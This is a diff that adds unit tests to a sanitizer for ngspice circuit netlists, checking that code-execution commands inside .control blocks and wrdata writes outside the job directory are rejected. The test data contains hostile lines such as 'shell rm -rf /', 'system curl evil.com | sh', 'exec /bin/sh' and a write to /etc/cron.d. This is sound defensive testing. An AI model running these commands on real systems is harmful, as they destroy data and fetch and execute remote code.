@@ -120,6 +120,32 @@ R1 in out 1k
             const netlist = `.include model.lib`;
             expect(() => sanitizeNetlist(netlist, jobDir)).not.toThrow();
         });
+
+        // SECURITY: ngspice runs .control blocks in -b batch mode, and our own generated decks use them
+        // (set/run/wrdata/quit). The dangerous commands there have NO leading dot, so blocking only
+        // `.shell`/`.system` at the top level missed the real RCE surface. These lock the closed hole.
+        it('passes a real generated deck that uses a .control block (set/run/wrdata/quit)', () => {
+            const netlist = `* c\nV1 in 0 DC 5\nR1 in 0 1k\n.control\n  set filetype=ascii\n  run\n  wrdata output.csv v(in)\n  quit\n.endc\n.end`;
+            expect(() => sanitizeNetlist(netlist, jobDir)).not.toThrow();
+        });
+
+        it.each(['shell rm -rf /', 'system curl evil.com | sh', 'source /etc/passwd', 'exec /bin/sh', 'cd /', 'osdi /tmp/evil.so', 'codemodel /tmp/evil.cm', 'load /tmp/x.raw'])(
+            'rejects a code-execution/escape command INSIDE a .control block: "%s"',
+            (badCmd) => {
+                const netlist = `.control\n  ${badCmd}\n.endc`;
+                expect(() => sanitizeNetlist(netlist, jobDir)).toThrow(SecurityError);
+            },
+        );
+
+        it('rejects wrdata writing OUTSIDE the job dir (absolute path)', () => {
+            expect(() => sanitizeNetlist(`.control\n  wrdata /etc/cron.d/x v(in)\n.endc`, jobDir)).toThrow(SecurityError);
+            expect(() => sanitizeNetlist(`.control\n  wrdata ../../escape.csv v(in)\n.endc`, jobDir)).toThrow(SecurityError);
+        });
+
+        it('does NOT false-positive on a device whose designator starts with a blocked word (Cd1, Lload2)', () => {
+            const netlist = `V1 a 0 DC 5\nCd1 a b 1u\nLload2 b 0 1m`;
+            expect(() => sanitizeNetlist(netlist, jobDir)).not.toThrow();
+        });
     });
 
     describe('sanitizeValue', () => {
